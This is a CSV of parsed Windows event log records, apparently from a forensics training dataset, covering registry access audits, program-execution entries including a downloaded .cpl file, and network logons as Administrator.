RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
100,452910,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
101,452911,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
102,452912,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
103,452913,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
104,452914,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
105,452915,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
106,452916,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
107,452917,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
108,452918,2019-03-19 23:35:15.3354341,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
109,452919,2019-03-19 23:35:15.3654773,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
110,452920,2019-03-19 23:35:15.3654773,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
111,452921,2019-03-19 23:35:15.3654773,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\FipsAlgorithmPolicy,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa\\FipsAlgorithmPolicy""},{""@Name"":""HandleId"",""#text"":""0x1AC""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
112,452922,2019-03-19 23:35:15.3654773,4663,LogAlways,Microsoft-Windows-Security-Auditing,Security,4,60,PC01.example.corp,1,,Attempt was made to access an object,NT AUTHORITY\LOCAL SERVICE,,ObjectServer: Security,ObjectType: Key,ObjectName: \REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa,"AccessList: Unknown code (%%4432, )",,,C:\Windows\System32\svchost.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/DE_1102_security_log_cleared.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-19""},{""@Name"":""SubjectUserName"",""#text"":""LOCAL SERVICE""},{""@Name"":""SubjectDomainName"",""#text"":""NT AUTHORITY""},{""@Name"":""SubjectLogonId"",""#text"":""0x3E5""},{""@Name"":""ObjectServer"",""#text"":""Security""},{""@Name"":""ObjectType"",""#text"":""Key""},{""@Name"":""ObjectName"",""#text"":""\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Control\\Lsa""},{""@Name"":""HandleId"",""#text"":""0x420""},{""@Name"":""AccessList"",""#text"":""%%4432, ""},{""@Name"":""AccessMask"",""#text"":""0x1""},{""@Name"":""ProcessId"",""#text"":""0x5A8""},{""@Name"":""ProcessName"",""#text"":""C:\\Windows\\System32\\svchost.exe""}]}}"
1,1,2019-07-18 21:50:20.0494017,17,Info,Microsoft-Windows-Program-Compatibility-Assistant,Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant,5020,7468,MSEDGEWIN10,0,S-1-5-18,Path of executed program,,,,,,,,,C:\Users\IEUser\Desktop\procexp64.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_via_cpl_Application_Experience_EventID_17_ControlPanelApplet.evtx,0x4000000000000000,0,"{""UserData"":{""ResolverFiredEvent"":{""ExePath"":""C:\\Users\\IEUser\\Desktop\\procexp64.exe"",""ResolverName"":""WrpKeyMitigation""}}}"
2,2,2019-07-29 21:11:17.2821889,17,Info,Microsoft-Windows-Program-Compatibility-Assistant,Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant,4396,3944,MSEDGEWIN10,0,S-1-5-18,Path of executed program,,,,,,,,,C:\Users\IEUser\Downloads\Invoice@0582.cpl,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_via_cpl_Application_Experience_EventID_17_ControlPanelApplet.evtx,0x4000000000000000,0,"{""UserData"":{""ResolverFiredEvent"":{""ExePath"":""C:\\Users\\IEUser\\Downloads\\Invoice@0582.cpl"",""ResolverName"":""ControlPanelApplet""}}}"
3,3,2019-07-29 21:14:29.6387462,17,Info,Microsoft-Windows-Program-Compatibility-Assistant,Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant,4396,3976,MSEDGEWIN10,0,S-1-5-18,Path of executed program,,,,,,,,,C:\Users\IEUser\Desktop\procexp64.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_via_cpl_Application_Experience_EventID_17_ControlPanelApplet.evtx,0x4000000000000000,0,"{""UserData"":{""ResolverFiredEvent"":{""ExePath"":""C:\\Users\\IEUser\\Desktop\\procexp64.exe"",""ResolverName"":""WrpKeyMitigation""}}}"
4,4,2019-08-23 11:17:00.4833767,17,Info,Microsoft-Windows-Program-Compatibility-Assistant,Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant,1404,1644,MSEDGEWIN10,0,S-1-5-18,Path of executed program,,,,,,,,,C:\Users\IEUser\Desktop\procexp64.exe,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/Exec_via_cpl_Application_Experience_EventID_17_ControlPanelApplet.evtx,0x4000000000000000,0,"{""UserData"":{""ResolverFiredEvent"":{""ExePath"":""C:\\Users\\IEUser\\Desktop\\procexp64.exe"",""ResolverName"":""WrpKeyMitigation""}}}"
1,563265,2019-03-18 22:15:36.0363760,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,696,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-," (fe80::79bf:8ee2:433c:2567)",Target: EXAMPLE\WIN-77LTAPHIQ1R$,LogonType 3,LogonId: 0x10FAC2,AuthenticationPackageName: Kerberos,LogonProcessName: Kerberos,,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""WIN-77LTAPHIQ1R$""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x10FAC2""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""5fdb15ee-2283-f23c-e23b-5e5ddb11bb9c""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::79bf:8ee2:433c:2567""},{""@Name"":""IpPort"",""#text"":""55585""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1840""}]}}"
2,563285,2019-03-18 22:15:49.5831024,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,3564,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-," (10.0.2.17)",Target: EXAMPLE\Administrator,LogonType 3,LogonId: 0x10FBCC,AuthenticationPackageName: Kerberos,LogonProcessName: Kerberos,,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-500""},{""@Name"":""TargetUserName"",""#text"":""Administrator""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x10FBCC""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""baec19da-130d-80f0-bd26-78045ee64d62""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""10.0.2.17""},{""@Name"":""IpPort"",""#text"":""49244""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""}]}}"
3,563294,2019-03-18 22:15:49.6142938,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,3564,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-," (10.0.2.17)",Target: EXAMPLE\Administrator,LogonType 3,LogonId: 0x10FBEB,AuthenticationPackageName: Kerberos,LogonProcessName: Kerberos,,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-500""},{""@Name"":""TargetUserName"",""#text"":""Administrator""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x10FBEB""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""baec19da-130d-80f0-bd26-78045ee64d62""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""10.0.2.17""},{""@Name"":""IpPort"",""#text"":""49249""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""}]}}"
4,563297,2019-03-18 22:15:49.6142938,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,452,3564,WIN-77LTAPHIQ1R.example.corp,0,,Successful logon,-\-,PC01 (10.0.2.17),Target: EXAMPLE\Administrator,LogonType 3,LogonId: 0x10FC09,AuthenticationPackageName: NTLM,"LogonProcessName: NtLmSsp ",,-,False,/home/sansforensics/dfirllama-sift/demo/real_data/evtx/LM_WMI_4624_4688_TargetHost.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-21-1587066498-1489273250-1035260531-500""},{""@Name"":""TargetUserName"",""#text"":""Administrator""},{""@Name"":""TargetDomainName"",""#text"":""EXAMPLE""},{""@Name"":""TargetLogonId"",""#text"":""0x10FC09""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""NtLmSsp ""},{""@Name"":""AuthenticationPackageName"",""#text"":""NTLM""},{""@Name"":""WorkstationName"",""#text"":""PC01""},{""@Name"":""LogonGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""NTLM V2""},{""@Name"":""KeyLength"",""#text"":""128""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""10.0.2.17""},{""@Name"":""IpPort"",""#text"":""49249""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""}]}}"
